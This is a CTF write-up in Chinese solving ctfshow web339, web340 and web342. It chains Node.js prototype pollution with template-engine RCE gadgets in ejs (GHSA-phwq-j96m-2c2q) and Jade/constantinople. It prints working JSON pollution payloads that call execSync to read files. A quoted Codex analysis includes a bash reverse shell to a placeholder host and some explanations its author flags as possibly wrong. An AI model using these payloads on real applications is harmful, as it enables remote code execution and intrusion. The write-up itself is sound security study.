---
tags:
  - CTF
  - ctfshow
  - 题目
---


题目源代码
![[web339 (1).zip]]

## 解题过程
### 分析

#### 1.已知的 ejs RCE 漏洞
用 `npm audit` 能扫出多个已知漏洞，我们关注
```
ejs template injection vulnerability - https://github.com/advisories/GHSA-phwq-j96m-2c2q
```
这是他的[详细分析](https://eslam.io/posts/ejs-server-side-template-injection-rce/)

简单来说，ejs里的代码有个地方是这样写的
```node
if (opts.outputFunctionName) {
    prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```
`outputFunctionName` 一般不会被设置，也就是没有值，所以可以用原型链污染他。
污染之后， `outputFunctionName` 会被加入模板编译代码。
例如，这样的 Payload `x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s` ，将被拼接成
```node
var x;process.mainModule.require('child_process').execSync('touch /tmp/pwned');s= __append;
```

#### 2. 原型链污染漏洞
题目中有原型链污染漏洞
```node
// utils/common.js
function copy(object1, object2) {
  for (let key in object2) {
    if (key in object2 && key in object1) {
      copy(object1[key], object2[key]);
    } else {
      object1[key] = object2[key];
    }
  }
}
```

```node
// routes/login.js

router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body); // 这里可以进行原型链污染
  if(secert.ctfshow===flag){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  
  }
  
  
});
```

#### 3.另一个RCE漏洞

```node
// routes/api.js

router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  res.render('api', { query: Function(query)(query)}); 
   
});
```

如果 `query` 可控的话，这里可以执行任意代码，但可惜的是，`query` 从未定义。
如果在**非严格模式**的情况下，未声明变量访问会**尝试查全局对象属性**，但是本题我试过通过原型链污染 `query` 属性，但访问 `/api` 只能不断得到错误页面，推测其开启了严格模式。

### 利用

首先利用原型链污染 `outputFunctionName` 属性，往 `/login` 中发送
```json
{
	"__proto__": {
		"outputFunctionName": "_;return global.process.mainModule.constructor._load('child_process').execSync('cat /app/routes/login.js').toString();var __"
	}
}
```
然后随便访问页面就有了

![[Pasted image 20260430140001.png]]

---

## 其他例子
### web340
[web340](https://ctf.show/challenges#web340-824)

这道题中 GHSA-phwq-j96m-2c2q 依旧可用

```node
// 只有 routes/login.js 的部分不同

router.post('/', require('body-parser').json(),function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var user = new function(){
    this.userinfo = new function(){
    this.isVIP = false;
    this.isAdmin = false;
    this.isAuthor = false;     
    };
  }
  utils.copy(user.userinfo,req.body);
  if(user.userinfo.isAdmin){
   res.end(flag);
  }else{
   return res.json({ret_code: 2, ret_msg: '登录失败'});  
  }

});
```

这里的 `userinfo` 是一个函数对象，他的第一个原型是函数的原型
![[Pasted image 20260430143649.png|413]]

![[Pasted image 20260430143523.png|430]]

所以这里我们的payload套两层 `__proto__`
```json
{
  "__proto__": {
    "__proto__": {
      "outputFunctionName": "_;return global.process.mainModule.constructor._load('child_process').execSync('cat routes/login.js').toString();var __"
    }
  }
}
```

![[Pasted image 20260430144233.png]]

---
### web342
[WEB342](https://ctf.show/challenges#web342-826)
![[web342.zip]]

这题不再可用ejs的已知漏洞，题目将模板引擎更换为了jade。
依然使用 `npm audit`
这次我们关注
```
constantinople  <3.1.1
Severity: critical
Sandbox Bypass Leading to Arbitrary Code Execution in constantinople - https://github.com/advisories/GHSA-4vmm-mhcq-4x9j
fix available via `npm audit fix --force`
Will install jade@1.9.2, which is a breaking change
node_modules/constantinople
```
但是在网上找不到公开的分析或可利用的代码。我让codex给我写了分析。
[[constantinople 沙箱绕过漏洞深度分析 GHSA-4vmm-mhcq-4x9j]]

web应用本身没有直接引入 constantinople，但通过 `jade` 间接引入了
```bash
nullsky@Shader:~/Workspaces/temp/web342$ npm ls constantinople jade
web334@0.0.0 /home/nullsky/Workspaces/temp/web342
└─┬ jade@1.11.0
  └── constantinople@3.0.2
```

搜索一下 `jade` 哪个地方调用了 constantinople，看看能不能用原型链污染。
以下是Codex的分析

> [!NOTE] Codex 的分析
> **攻击链总览**
> - 第一步：`POST /login` 通过 `utils.copy` 触发原型污染，把恶意字段写到 `Object.prototype`
> - 第二步：`GET /` 触发 `res.render('index')`，进入 Jade 编译/渲染流程
> - 第三步：Jade 在遍历 AST 节点时读取到被污染的继承属性（如 `type: "Code"`），走到 `visitCode` 等危险分支
> - 第四步：恶意代码字符串被拼进模板函数并执行，拿到 `process` 后可进一步 RCE（如读 `env`）
> 
> ---
> 
> **Payload（你给的这份）**
> ```http
> POST /login
> Content-Type: application/json
> 
> {
>   "__proto__": {
>     "__proto__": {
>       "type": "Code",
>       "self": 1,
>       "line": "global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/x.x.x.x/x 0>&1\"')"
>     }
>   }
> }
> ```
> 
> ---
> 
> **链路图（带代码定位）**
> 
> - `POST /login` 入口  
>   - `web342/routes/login.js:8`
>   ```js
>   router.post('/', require('body-parser').json(), function(req, res, next) {
>   ```
>   - `web342/routes/login.js:17`
>   ```js
>   utils.copy(user.userinfo, req.body);
>   ```
> 
> - 原型污染发生点  
>   - `web342/utils/common.js:7`
>   ```js
>   function copy(object1, object2){
>     for (let key in object2) {
>       if (key in object2 && key in object1) {
>         copy(object1[key], object2[key])
>       } else {
>         object1[key] = object2[key]
>       }
>     }
>   }
>   ```
>   关键问题：
>   - `for...in` 会枚举可枚举属性；
>   - 未过滤 `__proto__` / `constructor` / `prototype`；
>   - 递归赋值可把数据写入原型链对象。
> 
> - `GET /` 触发模板渲染  
>   - `web342/routes/index.js:7`
>   ```js
>   res.render('index', { title: 'ctfshow' });
>   ```
>   - `web342/app.js:31`
>   ```js
>   app.engine('jade', require('jade').__express);
>   ```
>   - `web342/app.js:32`
>   ```js
>   app.set('view engine', 'jade');
>   ```
> 
> - Jade 编译分发点（按 `node.type` 动态分派）  
>   - `web342/node_modules/jade/lib/compiler.js:224`
>   ```js
>   visitNode: function(node){
>     return this['visit' + node.type](node);
>   },
>   ```
>   如果节点对象在原型链上“继承”到 `type: "Code"`，会走 `visitCode`。
> 
> - 危险执行拼接点  
>   - `web342/node_modules/jade/lib/compiler.js:564`
>   ```js
>   visitCode: function(code){
>     if (code.buffer) {
>       var val = code.val.trim();
>       ...
>       this.bufferExpression(val);
>     } else {
>       this.buf.push(code.val);
>     }
>     ...
>   },
>   ```
>   这里是经典危险点：把代码文本推入最终模板函数源码缓冲。
> 
> - `constantinople` 参与点（编译期常量折叠）  
>   - `web342/node_modules/jade/lib/compiler.js:10`
>   ```js
>   var constantinople = require('constantinople');
>   ```
>   - `web342/node_modules/jade/lib/compiler.js:12-16`
>   ```js
>   function isConstant(src) { return constantinople(src, {...}); }
>   function toConstant(src) { return constantinople.toConstant(src, {...}); }
>   ```
>   它会在 `bufferExpression/attrs` 等路径参与表达式处理，老版本（3.0.2）本身也有已知 RCE 风险面。
> 
> ---
> 
> **这个 Payload 三个字段各自干什么**
> 
> - `type: "Code"`  
>   让本该走普通节点逻辑的对象，进入 `visitCode` 分支。
> 
> - `line: "global.process.mainModule.require(...)"`  
>   在老 Jade 编译路径里，节点相关字段会参与调试/代码生成过程；被污染后可能进入模板函数源码拼接链。
> 
> - `self: 1`  
>   用于满足/扰动某些对象状态判断，让“伪造代码节点”更稳定生效（CTF 常见辅助字段）。
> 
> ---
> 
> **为什么“先 /login 再 /”**
> 
> - `/login`：只做“污染写入”（布置状态）
> - `/`：触发 Jade 模板编译/渲染（执行状态）
> 
> 这是典型二阶段利用链。
> 

> [!attention]
> 该题目前没有足够的信息确保解释正确！